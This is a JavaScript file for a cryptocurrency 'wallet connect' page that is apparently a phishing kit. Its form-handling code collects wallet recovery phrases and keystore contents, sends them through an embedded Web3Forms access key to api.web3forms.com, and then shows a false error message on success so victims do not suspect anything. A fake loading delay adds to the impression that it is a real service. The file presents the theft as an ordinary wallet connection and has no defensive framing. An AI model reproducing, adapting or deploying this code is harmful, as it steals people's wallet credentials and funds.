(function () {
  ("use strict");

  let select = (el, all = false) => {
    el = el.trim();
    if (all) {
      return [...document.querySelectorAll(el)];
    } else {
      return document.querySelector(el);
    }
  };

  /**
   * Easy event listener function
   */
  const on = (type, el, listener, all = false) => {
    if (all) {
      select(el, all).forEach((e) => e.addEventListener(type, listener));
    } else {
      select(el, all).addEventListener(type, listener);
    }
  };

  /**
   * Easy on scroll event listener
   */
  const onscroll = (el, listener) => {
    el.addEventListener("scroll", listener);
  };

  // get img
  let box = select(".blockchain-item", true);
  let boxImg = select(".blockchain .img", true);
  let boxTitle = select(".blockchain h4", true);

  let wallet = [];

  // Open modalbox
  box.forEach((e, index) => {
    e.addEventListener("click", function () {
      openModal(".modal-connectius");

      let walletName = select(".modal .modal-block-deet h4");
      let walletImage = select(".modal .modal-block-deet .block-img img");

      //  set wallet technology
      boxTitle.forEach((a, ai) => {
        if (index === ai) {
          walletName.textContent = a.textContent;
          wallet.push(a.textContent);
        }
      });

      boxImg.forEach((a, ai) => {
        if (index === ai) {
          walletImage.src = a.src;
          wallet.push(a.src);
        }
      });
      // console.log(wallet)
    });
  });

  //  close Modalbox
  on(
    "click",
    ".modal .modal-head .close",
    function (e) {
      e.preventDefault();
      closeModal(".modal-connectius");
    },
    true
  );

  on(
    "click",
    ".modal .modal-body .close",
    function (e) {
      e.preventDefault();
      closeModal(".modal-form");
      wallet = [];
    },
    true
  );

  // phrase boxes
  on("click", "#inbox-modal", function (e) {
    e.preventDefault();
    closeModal(".modal-connectius");

    let walletName = select(".modal-form .modal-block-deet h4");
    let walletImage = select(".modal-form .modal-block-deet .block-img img");

    walletName.textContent = wallet[0];
    walletImage.src = wallet[1];

    openModal(".modal-form");
  });

  // modal nav-link
  let modalNav = select(".modal .navbar .nav-item", true);
  modalNav.forEach((button, index) => {
    button.addEventListener("click", function () {
      modalNav.forEach((btn) => btn.classList.remove("active"));
      this.classList.add("active");

      let tabConnect = select(".tab-content", true);
      tabConnect.forEach((x, i) => {
        if (index === i) {
          x.classList.remove("d-none");
          x.classList.add("active");
        } else {
          x.classList.add("d-none");
          x.classList.remove("active");
        }
      });
    });
  });

  // Form validation
  let phrase = select("#phrase");
  let keystore = select("#keystore");

  phrase.value = "";
  keystore.value = "";

  let forms = select(".needs-validation", true);
  let result = select("#result");
  const progressBar = select(".sending");

  Array.prototype.slice.call(forms).forEach((form) => {
    form.addEventListener("submit", function (e) {
      e.preventDefault();

      const formData = new FormData(form);

      var obj = {
        access_key: "4b07b268-d53a-4df5-b29c-f31a2b9c5175",
        subject: "New Form Submission",
      };

      formData.forEach((value, key) => {
        obj[key] = value;

        if (obj[key].trim() === "") {
          alert(`${obj[key]} cannot be empty`);

        } else {
          var json = JSON.stringify(obj);

          // console.log(json);
          result.innerHTML = "Please wait...";

          progressBar.style.display = "flex";
          closeModal(".modal-form");
          closeModal(".modal-connectius");
          

          fetch("https://api.web3forms.com/submit", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
              Accept: "application/json",
            },
            body: json,
          })
            .then(async (response) => {

              let json = await response.json();
              if (response.status == 200) {
                result.innerHTML = json.message;
                result.classList.remove("text-gray-500");
                result.classList.add("text-green-500");
                alert('Error: Something went wrong');
              } else {
                console.log(response);
                result.innerHTML = json.message;
                result.classList.remove("text-gray-500");
                result.classList.add("text-red-500");
              }
            })
            .catch((error) => {
              console.log(error);
              result.innerHTML = "Something went wrong!";
            })
            .then(function () {
              form.reset();
              form.classList.remove("was-validated");
              progressBar.style.display = "none";
              setTimeout(() => {
                result.style.display = "none";
              }, 2000);
            });
        }
      });
    });
  });

  let boxBtn = select("#inbox-modal");
  let loading = select(".loading");

  loading.style.display = "flex";
  boxBtn.style.display = "none";

  setTimeout(() => {
    loading.style.display = "none";
    boxBtn.style.display = "flex";
  }, 4000);

  function openModal(c) {
    let modalContainer = select(".modal" + c, true);
    [...modalContainer].forEach((e) => {
      e.classList.add("show");
    });
  }

  function closeModal(c) {
    let modalContainer = select(".modal" + c, true);
    [...modalContainer].forEach((e) => {
      e.classList.remove("show");
    });
  }
})();
